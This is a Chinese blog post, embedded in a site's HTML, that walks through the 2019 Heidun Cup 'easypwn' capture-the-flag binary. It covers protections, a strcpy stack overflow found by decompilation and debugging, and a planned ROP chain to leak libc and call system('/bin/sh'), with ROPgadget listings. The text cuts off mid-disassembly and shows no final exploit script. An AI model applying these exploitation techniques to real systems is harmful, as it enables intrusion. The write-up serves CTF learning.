@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="首先检查一下程序保护措施 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  可以发现程序开启了NX保护即栈不可执行保护，我们再开启IDA Pro进行反汇编 1234567891011__int64">
+<meta property="og:type" content="article">
+<meta property="og:title" content="黑盾杯-2019-PWN-easypwn">
+<meta property="og:url" content="http://yoursite.com/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="首先检查一下程序保护措施 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  可以发现程序开启了NX保护即栈不可执行保护，我们再开启IDA Pro进行反汇编 1234567891011__int64">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-09-19T03:30:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="黑盾杯-2019-PWN-easypwn">
+<meta name="twitter:description" content="首先检查一下程序保护措施 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  可以发现程序开启了NX保护即栈不可执行保护，我们再开启IDA Pro进行反汇编 1234567891011__int64">
+  <link rel="canonical" href="http://yoursite.com/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>黑盾杯-2019-PWN-easypwn | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">黑盾杯-2019-PWN-easypwn
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-09-18 05:30:12 / Geändert am: 20:30:44" itemprop="dateCreated datePublished" datetime="2019-09-18T05:30:12-07:00">2019-09-18</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先检查一下程序保护措施</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>可以发现程序开启了<strong>NX</strong>保护即栈不可执行保护，我们再开启<strong>IDA Pro</strong>进行反汇编</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to CTF\n"</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  sub_4006C6(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们查看<strong>sub_4006C6</strong>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4006C6</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现到一个显著的栈溢出漏洞，可以看见read函数读取了长度为<strong>0x400(1024)</strong>的字符，然而<strong>sub_4006C6</strong>函数里面的可以看到栈桢的大小是<strong>10h</strong></p>
+<p>由于<strong>sub_4006C6</strong>函数的栈桢大小<strong>10h</strong>远小于<strong>read</strong>函数可以读取的数据长度<strong>400h</strong>，在进行循环赋值的时候，<strong>sub_4006C6</strong>函数保存在栈中的返回地址会被覆盖</p>
+<p>我们进行动态调式验证一下我们的判断</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b *0x00000000004006F6</span><br><span class="line">Breakpoint 1 at 0x4006f6</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /mnt/hgfs/share/easypwn/easypwn </span><br><span class="line">Welcome to CTF</span><br><span class="line">aaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004006f6 in ?? ()</span><br></pre></td></tr></table></figure>
+
+<p>我们查看一下栈上的情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rsp      0x7fffffffda60 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">01:0008│          0x7fffffffda68 —▸ 0x7fffffffda90 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">02:0010│ rsi      0x7fffffffda70 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">... ↓</span><br><span class="line">04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现函数的返回地址就是如下图所示，且即将被覆盖，超过<strong>0x18</strong>字节即会覆盖返回地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1</span><br></pre></td></tr></table></figure>
+
+<p>由于程序设置了栈不可执行，可以构造<strong>ROP</strong>链，泄露<strong>libc</strong>中的函数</p>
+<p><strong>64</strong>位程序和我们之前一直做的<strong>32</strong>位程序在传参数方式上有很大的不同</p>
+<p><strong>64</strong>位和<strong>32</strong>位的区别主要有两点：首先是内存地址的范围由<strong>32</strong>位变成了<strong>64</strong>位。但是可以使用的内存地址不能大于<code>0x00007FFFFFFFFFFF</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，<strong>x86</strong>中参数都是保存在栈上,但在x64中的前六个参数依次保存在<strong>RDI</strong>, <strong>RSI</strong>, <strong>RDX</strong>, <strong>RCX</strong>,<strong>R8</strong>和 <strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<strong>gadget</strong>，</p>
+<p>由于<strong>sub_4006C6</strong>拷贝时，会被<strong>\x00</strong>截断，所以不能连续覆盖多个地址来<strong>ROP</strong>，</p>
+<p>在<strong>sub_4006C6</strong>函数<strong>ret</strong>处下断点，调试可以发现<strong>sub_4006C6</strong>返回地址下方即为<strong>read</strong>时的<strong>buf</strong>处</p>
+<p>所以可以覆盖返回地址为<strong>pop pop pop pop ret</strong>指令地址，返回时弹出<strong>0x18</strong>个填充字节和返回地址,返回到<strong>buf+0x20</strong>处，就避开了栈不可执行</p>
+<p>在<strong>buf+0x20</strong>处构造<strong>ROP</strong>，通过write函数，先泄露<strong>libc</strong>基地址，返回到<strong>start</strong></p>
+<p>重新执行，输入使之执行<strong>system(‘/bin/sh’)</strong></p>
+<p>需要用到的信息，包括<strong>bss</strong>段的地址、<strong>main</strong>函数地址、程序中已有函数的地址、<strong>gadgets</strong>地址</p>
+<p>所以我们直接只用<strong>ROP gadgets</strong>工具寻找64位环境下可以使用的<strong>gadgets</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/Untitled Folder$ ROPgadget --binary easypwn</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400622 : adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x000000000040061e : adc dword ptr [rbp - 0x41], ebx ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004007ef : add bl, dh ; ret</span><br><span class="line">0x00000000004007ed : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004007eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x000000000040076d : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040062c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040076e : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x000000000040053b : add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x000000000040076f : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040062e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ee : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400698 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x0000000000400770 : add cl, cl ; ret</span><br><span class="line">0x0000000000400694 : add eax, 0x2009de ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400699 : add ebx, esi ; ret</span><br><span class="line">0x000000000040053e : add esp, 8 ; ret</span><br><span class="line">0x000000000040053d : add rsp, 8 ; ret</span><br><span class="line">0x0000000000400697 : and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x00000000004007c9 : call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007ca : call qword ptr [rsp + rbx*8]</span><br><span class="line">0x00000000004006be : call rax</span><br><span class="line">0x00000000004006fa : dec ecx ; ret</span><br><span class="line">0x0000000000400695 : fimul word ptr [rcx] ; and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x00000000004007cc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x00000000004006b9 : int1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x000000000040061d : je 0x400638 ; pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x000000000040066b : je 0x400680 ; pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004006b8 : je 0x4006b1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400625 : jmp rax</span><br><span class="line">0x00000000004006fb : leave ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040076c : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000004006bc : mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400620 : mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004006bb : mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400628 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004007e8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000400675 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400696 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040066c : or ebx, dword ptr [rbp - 0x41] ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e2 : pop r15 ; ret</span><br><span class="line">0x0000000000400621 : pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x0000000000400692 : pop rbp ; mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040061f : pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">0x00000000004007e1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ba : push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line">0x0000000000400296 : retf</span><br><span class="line">0x000000000040066a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x000000000040061c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004006b7 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax</span><br><span class="line">0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x000000000040062a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000004006b6 : test eax, eax ; je 0x4006b3 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004006b5 : test rax, rax ; je 0x4006b4 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 69</span><br></pre></td></tr></table></figure>
+
+<p>不过这样子有点太乱了，我们一般只需要使用<strong>pop</strong>、<strong>ret</strong>、<strong>mov</strong>类型的<strong>gadgets</strong>，所以我们再查一查</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/easypwn$ ROPgadget --binary easypwn --only "pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e2 : pop r15 ; ret</span><br><span class="line">0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">0x00000000004007e1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040076c : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000004006bc : mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400620 : mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004006bb : mov rbp, rsp ; call rax</span><br></pre></td></tr></table></figure>
+
+<p> 其实这题有坑，其实是存在我们常用的<strong>gadgets</strong>的，只是工具没有搜索出来，然后也没有标识<strong>__libc_csu_init()</strong>这个函数，就需要我们自己多去看看题目</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400780</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400780</span>                 push    r15</span><br><span class="line">.text:<span class="number">0000000000400782</span>                 push    r14</span><br><span class="line">.text:<span class="number">0000000000400784</span>                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">0000000000400787</span>                 push    r13</span><br><span class="line">.text:<span class="number">0000000000400789</span>                 push    r12</span><br><span class="line">.text:<span class="number">000000000040078B</span>                 lea     r12, off_600E10</span><br><span class="line">.text:<span class="number">0000000000400792</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400793</span>                 lea     rbp, off_600E18</span><br><span class="line">.text:<span class="number">000000000040079</span>A                 push    rbx</span><br><span class="line">.text:<span class="number">000000000040079B</span>                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">000000000040079</span>E                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004007</span>A1                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004007</span>A4                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004007</span>A8                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004007</span>AC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004007B</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004007B</span>4                 jz      <span class="keyword">short</span> loc_4007D6</span><br><span class="line">.text:<span class="number">00000000004007B</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004007B</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">00000000004007</span>C0</span><br><span class="line">.text:<span class="number">00000000004007</span>C0 loc_4007C0:                             ; CODE XREF: init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">00000000004007</span>C0                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">00000000004007</span>C3                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">00000000004007</span>C6                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">00000000004007</span>C9                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">00000000004007</span>CD                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004007</span>D1                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">00000000004007</span>D4                 jnz     <span class="keyword">short</span> loc_4007C0</span><br><span class="line">.text:<span class="number">00000000004007</span>D6</span><br><span class="line">.text:<span class="number">00000000004007</span>D6 loc_4007D6:                             ; CODE XREF: init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">00000000004007</span>D6                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004007</span>DA                 pop     rbx</span><br><span class="line">.text:<span class="number">00000000004007</span>DB                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004007</span>DC                 pop     r12</span><br><span class="line">.text:<span class="number">00000000004007</span>DE                 pop     r13</span><br><span 